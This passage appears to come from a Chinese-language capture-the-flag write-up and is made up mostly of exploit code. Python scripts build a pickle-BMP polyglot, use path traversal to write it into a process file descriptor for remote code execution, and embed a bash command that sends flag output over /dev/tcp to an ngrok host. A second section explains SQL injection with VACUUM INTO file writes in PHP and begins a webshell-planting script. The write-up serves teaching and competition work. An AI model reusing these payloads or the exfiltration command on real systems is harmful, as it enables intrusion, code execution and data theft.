<span class="number">3</span>):</span><br><span class="line">    B, G, R = data[i], data[i+<span class="number">1</span>], data[i+<span class="number">2</span>]</span><br><span class="line">    row.append((R, G, B)) </span><br><span class="line"></span><br><span class="line">pixels = im.load()</span><br><span class="line"><span class="keyword">for</span> x, (r, g, b) <span class="keyword">in</span> <span class="built_in">enumerate</span>(row):</span><br><span class="line">    pixels[x, H - <span class="number">1</span>] = (r, g, b)</span><br><span class="line"></span><br><span class="line">im.save(<span class="string">&quot;pickle.bmp&quot;</span>, <span class="built_in">format</span>=<span class="string">&quot;BMP&quot;</span>)</span><br><span class="line">im.save(<span class="string">&quot;pickle.png&quot;</span>, <span class="built_in">format</span>=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1:5000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bmp_payload</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;../../usr/share/doc/li<span class="subst">&#123;filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">else</span> filename&#125;</span>fr6/../../../../../..<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;/proc/self/fd/13&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(bmp_payload(p))</span><br><span class="line">r = requests.post(URL + <span class="string">&quot;/convert&quot;</span>, files=[</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;files&quot;</span>, (bmp_payload(p), <span class="built_in">open</span>(<span class="string">&quot;./pickle.png&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/png&quot;</span>)),</span><br><span class="line">], data=&#123;</span><br><span class="line"><span class="string">&quot;format&quot;</span>: <span class="string">&quot;BMP&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.content[:<span class="number">200</span>])</span><br></pre></td></tr></table></figure>

<p>exp3.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Bypass convert_image to write a crafted BMP file to an arbitrary path</span></span><br><span class="line"><span class="string">upload a lot of random images + one image to write into python&#x27;s multiprocessing /proc/self/fd/10 fd to reach _ForkingPickler.loads sink and load arbitrary pickle to achieve RCE</span></span><br><span class="line"><span class="string">craft a pickle-bmp polyglot to bypass PIL image formats checks</span></span><br><span class="line"><span class="string">/gamble until you get the right timing</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">CHALL_URL = <span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_target_arbw_path</span>(<span class="params">target_file: <span class="built_in">str</span>, ext_replace_path: <span class="built_in">str</span>, target_ext: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment">#print(f&quot;&#123;target_file=&#125;, &#123;ext_replace_path=&#125;, &#123;target_ext=&#125;&quot;)</span></span><br><span class="line">    prefix = <span class="string">&quot;/tmp/../..&quot;</span></span><br><span class="line">    ext_replace_path = ext_replace_path.replace(target_ext, target_file)</span><br><span class="line">    levels = ext_replace_path.count(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    final_path = prefix + ext_replace_path + (<span class="string">&quot;/..&quot;</span> * levels) + target_file</span><br><span class="line">    <span class="comment">#print(f&quot;[*] Target path: &#123;final_path&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> final_path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_normal_image</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    bio = io.BytesIO()</span><br><span class="line">    Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">1</span>, <span class="number">1</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>)).save(bio, <span class="built_in">format</span>=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.BytesIO(bio.getvalue()).getvalue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_files_payload</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pickle.bmp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle_buf = io.BytesIO(f.read())</span><br><span class="line">        pickle_buf.seek(<span class="number">0</span>)</span><br><span class="line">        pickle_polyglot = pickle_buf.getvalue()</span><br><span class="line">    </span><br><span class="line">    normal_image = build_normal_image()</span><br><span class="line">    ext_replace_path = <span class="string">&quot;/usr/lib/mime&quot;</span></span><br><span class="line">    target_ext = <span class="string">&quot;im&quot;</span></span><br><span class="line">    target_fd = <span class="number">10</span></span><br><span class="line">    files = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># sandwich the pickle payload with lots of normal image to hit the right timing</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">450</span>):</span><br><span class="line">        files.append((<span class="string">&quot;files&quot;</span>, (<span class="string">f&quot;fent_<span class="subst">&#123;n&#125;</span>&quot;</span>, normal_image, <span class="string">&quot;image/png&quot;</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">        target_filename = build_target_arbw_path(<span class="string">f&quot;/proc/self/fd/<span class="subst">&#123;target_fd&#125;</span>&quot;</span>, ext_replace_path, target_ext)</span><br><span class="line">        <span class="comment">#target_filename = f&quot;/tmp/../../usr/lib/m/proc/self/fd/&#123;target_fd&#125;e//../../../../../proc/self/fd/&#123;target_fd&#125;&quot;</span></span><br><span class="line">        files.append( (<span class="string">&quot;files&quot;</span>, (target_filename, pickle_polyglot, <span class="string">&quot;image/bmp&quot;</span>)) )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">450</span>):</span><br><span class="line">        files.append((<span class="string">&quot;files&quot;</span>, (<span class="string">f&quot;fent_<span class="subst">&#123;n+<span class="number">9999</span>&#125;</span>&quot;</span>, normal_image, <span class="string">&quot;image/png&quot;</span>)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> files</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>():</span><br><span class="line">    target_ext = <span class="string">&quot;im&quot;</span></span><br><span class="line">    files = build_files_payload()</span><br><span class="line">    data = &#123;<span class="string">&quot;format&quot;</span>: target_ext&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Sending <span class="subst">&#123;<span class="built_in">len</span>(files)&#125;</span> files to <span class="subst">&#123;CHALL_URL&#125;</span>/convert ...&quot;</span>)</span><br><span class="line">    r = requests.post(<span class="string">f&quot;<span class="subst">&#123;CHALL_URL&#125;</span>/convert&quot;</span>, files=files, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;POST /convert =&gt;&quot;</span>, r.status_code)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    rce()</span><br><span class="line"></span><br><span class="line"><span class="comment"># supported extensions</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">blp bmp dib bufr cur pcx dcx dds ps eps</span></span><br><span class="line"><span class="string">fit fits fli flc fpx ftc ftu gbr gif grib</span></span><br><span class="line"><span class="string">h5 hdf png apng jp2 j2k jpc jpf jpx j2c</span></span><br><span class="line"><span class="string">icns ico im iim jfif jpe jpg jpeg tif tiff</span></span><br><span class="line"><span class="string">mic mpg mpeg mpo msp palm pcd pdf pxr pbm</span></span><br><span class="line"><span class="string">pgm ppm pnm pfm psd qoi bw rgb rgba sgi</span></span><br><span class="line"><span class="string">ras tga icb vda vst webp wmf emf xbm xpm</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>makebmp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># File layout: [ 4-byte little-endian len(pickle_payload) ] + [ pickle_payload ]</span></span><br><span class="line"><span class="comment"># Also a valid BMP: first two bytes are &#x27;B&#x27;,&#x27;M&#x27; by choosing len % 65536 == 0x4D42.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_min_bmp</span>(<span class="params">width=<span class="number">1</span>, height=<span class="number">1</span>, bgr=(<span class="params"><span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span></span>)</span>):</span><br><span class="line">    <span class="comment"># Minimal 24-bit BMP (54-byte header + pixel data)</span></span><br><span class="line">    bfType = <span class="string">b&#x27;BM&#x27;</span></span><br><span class="line">    bfReserved1 = bfReserved2 = <span class="number">0</span></span><br><span class="line">    bfOffBits = <span class="number">14</span> + <span class="number">40</span></span><br><span class="line">    row_bytes = ((width * <span class="number">3</span> + <span class="number">3</span>) // <span class="number">4</span>) * <span class="number">4</span></span><br><span class="line">    pixel_data = (<span class="built_in">bytes</span>((bgr[<span class="number">0</span>], bgr[<span class="number">1</span>], bgr[<span class="number">2</span>])) +</span><br><span class="line">                  <span class="string">b&#x27;\x00&#x27;</span> * (row_bytes - width * <span class="number">3</span>)) * height</span><br><span class="line">    bfSize = bfOffBits + <span class="built_in">len</span>(pixel_data)</span><br><span class="line"></span><br><span class="line">    file_header = struct.pack(<span class="string">&#x27;&lt;2sIHHI&#x27;</span>, bfType, bfSize, bfReserved1, bfReserved2, bfOffBits)</span><br><span class="line">    info_header = struct.pack(<span class="string">&#x27;&lt;IIIHHIIIIII&#x27;</span>,</span><br><span class="line">                              <span class="number">40</span>, width, height, <span class="number">1</span>, <span class="number">24</span>, <span class="number">0</span>,</span><br><span class="line">                              <span class="built_in">len</span>(pixel_data), <span class="number">0x0B13</span>, <span class="number">0x0B13</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> file_header + info_header + pixel_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_lenprefixed_poly_bmp</span>(<span class="params">width=<span class="number">1</span>, height=<span class="number">1</span>, bgr=(<span class="params"><span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span></span>)</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Returns bytes: prefix(4) + pickle_payload</span></span><br><span class="line"><span class="string">    - prefix = len(pickle_payload) (little-endian), whose low 2 bytes are &#x27;B&#x27;,&#x27;M&#x27;</span></span><br><span class="line"><span class="string">    - pickle side effect: prints &quot;hello world!&quot; when unpickled</span></span><br><span class="line"><span class="string">    - BMP interpretation works because:</span></span><br><span class="line"><span class="string">        offset 0..1: &#x27;BM&#x27; (from length value)</span></span><br><span class="line"><span class="string">        offset 10..13 (bfOffBits) fall inside BINBYTES data, which we set to 54</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    bmp = make_min_bmp(width, height, bgr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># BINBYTES data &quot;D&quot;:</span></span><br><span class="line">    <span class="comment"># D[0]   = 0x00 (helps make reserved2==0 at offset 9)</span></span><br><span class="line">    <span class="comment"># D[1:]  = bmp[10:] (bfOffBits + info header + pixel data)</span></span><br><span class="line">    D = <span class="string">b&#x27;\x00&#x27;</span> + bmp[<span class="number">10</span>:]</span><br><span class="line">    <span class="comment"># keep 4th byte of BINBYTES length zero to aid reserved2==0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(D) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">24</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;D too large; keep image tiny so BINBYTES length&#x27;s MSB is 0.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_pickle</span>(<span class="params">extra_pairs=<span class="number">0</span>, D=D</span>):</span><br><span class="line">        P = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># --- BMP-critical prefix region (do not move these) ---</span></span><br><span class="line">        P += <span class="string">b&#x27;B&#x27;</span>                      <span class="comment"># BINBYTES</span></span><br><span class="line">        P += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">len</span>(D)) <span class="comment"># length of D</span></span><br><span class="line">        P += D                         <span class="comment"># data (contains bfOffBits etc.)</span></span><br><span class="line">        <span class="comment"># ------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># neutral padding: &#x27;N&#x27; (NONE) then &#x27;0&#x27; (POP), adds 2 bytes per pair</span></span><br><span class="line">        <span class="keyword">if</span> extra_pairs:</span><br><span class="line">            P += (<span class="string">b&#x27;N0&#x27;</span> * extra_pairs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now perform the side effect: print(&quot;hello world!&quot;)</span></span><br><span class="line">        <span class="comment"># Stack: [bytes] -&gt; POP -&gt; []</span></span><br><span class="line">        P += <span class="string">b&#x27;0&#x27;</span>                            <span class="comment"># POP the BINBYTES blob (keep stack tidy)</span></span><br><span class="line"></span><br><span class="line">        P += <span class="string">b&quot;cos\nsystem\n(Vbash -c \&quot;/readflag &#x27;--give-me-the-f|ag&#x27; &gt; /dev/tcp/6.tcp.eu.ngrok.io/14402\&quot;  \ntR.&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(P)</span><br><span class="line"></span><br><span class="line">    TARGET_LOW16 = <span class="number">0x4D42</span>  <span class="comment"># &#x27;M&#x27;&#x27;B&#x27; in little-endian low word -&gt; file starts with &#x27;BM&#x27;</span></span><br><span class="line">    P0 = make_pickle(<span class="number">0</span>, D)</span><br><span class="line">    need16 = (TARGET_LOW16 - (<span class="built_in">len</span>(P0) &amp; <span class="number">0xFFFF</span>)) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># parity fix: allow adding one trailing 0x00 into D (harmless), then recompute</span></span><br><span class="line">    <span class="keyword">if</span> need16 &amp; <span class="number">1</span>:</span><br><span class="line">        D = D + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        P0 = make_pickle(<span class="number">0</span>, D)</span><br><span class="line">        need16 = (TARGET_LOW16 - (<span class="built_in">len</span>(P0) &amp; <span class="number">0xFFFF</span>)) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">    extra_pairs = need16 // <span class="number">2</span></span><br><span class="line">    P = make_pickle(extra_pairs, D)</span><br><span class="line"></span><br><span class="line">    prefix = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">len</span>(P))</span><br><span class="line">    <span class="keyword">assert</span> prefix[:<span class="number">2</span>] == <span class="string">b&#x27;BM&#x27;</span>, <span class="string">&quot;First two bytes must be &#x27;BM&#x27; for BMP magic&quot;</span></span><br><span class="line">    <span class="comment"># File is exactly: [len(P)] + [P]</span></span><br><span class="line">    <span class="keyword">return</span> prefix + P</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    out = Path(<span class="string">&#x27;pickle.bmp&#x27;</span>)</span><br><span class="line">    data = build_lenprefixed_poly_bmp()</span><br><span class="line">    out.write_bytes(data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># sanity checks</span></span><br><span class="line">    raw = out.read_bytes()</span><br><span class="line">    pick_len = <span class="built_in">int</span>.from_bytes(raw[:<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> pick_len == <span class="built_in">len</span>(raw) - <span class="number">4</span></span><br><span class="line">    <span class="keyword">assert</span> raw[:<span class="number">2</span>] == <span class="string">b&#x27;BM&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Wrote <span class="subst">&#123;out&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(raw)&#125;</span> bytes)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;    prefix len=<span class="subst">&#123;pick_len&#125;</span> bytes; structure = [4-byte len] + [pickle_payload]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] unpickle test...&#x27;</span>)</span><br><span class="line">    pickle.loads(raw[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="Pholyglot"><a href="#Pholyglot" class="headerlink" title="Pholyglot!"></a>Pholyglot!</h2><p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;err?&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$msg</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;msg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$msg</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$msg</span>) &lt;= <span class="number">30</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">133</span>, <span class="number">3337</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;.db&quot;</span>);</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">            CREATE TABLE msg (content TEXT);</span></span><br><span class="line"><span class="string">            INSERT INTO msg VALUES(&#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">        &quot;</span>, <span class="variable">$msg</span>));</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="string">&quot;.db&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>SQLite3::exec()</code> 可以一次执行多条 SQL，用分号分隔。并且把 <code>INSERT INTO msg VALUES(&#39;%s&#39;)</code> 里的 <code>%s</code> 直接拼接了用户输入，等于给了我们闭合字符串 + 追加任意 SQL的能力。</p>
<p>数据库文件名固定为当前目录下的 .db，操作结束后 <code>unlink(&quot;.db&quot;)</code> 只是把原始 DB 删了；SQLite 的 <code>VACUUM INTO &#39;path&#39;</code> 能把当前数据库拷贝到任意路径&#x2F;文件名（相对当前工作目录），相当于任意写文件。我们可以在执行期间把它复制到想要的名字（<code>VACUUM INTO &#39;目标文件&#39;</code>），于是留下任意文件。</p>
<p>另外长度限制 <code>strlen($msg) &lt;= 30</code>，所以 payload 都要控制在 30 字节以内</p>
<p>接下来先上exp，然后逐步分析</p>
<p>exp1.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;http://localhost:8080/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># EXTERNAL_IP = &quot;...&quot;</span></span><br><span class="line"><span class="comment"># SANDBOX_HASH = hashlib.md5(b&quot;orange&quot; + EXTERNAL_IP.encode()).hexdigest()</span></span><br><span class="line">SANDBOX_HASH = <span class="string">&quot;9a2da4359c2e191fa6f2a122918617d6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    x = requests.get(HOST, params=&#123;<span class="string">&quot;reset&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    x.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> x.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_msg</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;msg of length&quot;</span>, <span class="built_in">len</span>(msg))</span><br><span class="line">    x = requests.get(HOST, params=&#123;<span class="string">&quot;msg&quot;</span>: msg&#125;)</span><br><span class="line">    x.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> x.text</span><br><span class="line"></span><br><span class="line">reset()</span><br><span class="line">execute_msg(<span class="string">&quot;&quot;&quot;&lt;?=`*`;&#x27;);VACUUM INTO(&#x27;z.php&quot;&quot;&quot;</span>)</span><br><span class="line">execute_msg(<span class="string">&quot;&quot;&quot;&#x27;);VACUUM INTO(&#x27;php&quot;&quot;&quot;</span>)</span><br><span class="line">execute_msg(<span 